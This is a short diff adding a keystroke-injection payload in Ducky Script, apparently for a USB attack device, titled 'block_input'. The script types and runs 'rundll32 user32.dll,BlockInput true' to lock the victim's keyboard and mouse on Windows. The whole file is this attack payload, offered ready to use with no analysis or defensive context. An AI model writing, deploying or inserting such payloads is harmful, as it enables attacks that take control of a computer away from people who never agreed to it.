@@ -1,0 +1,4 @@
+REM Payload: block_input
+DELAY 500
+STRING rundll32 user32.dll,BlockInput true
+ENTER
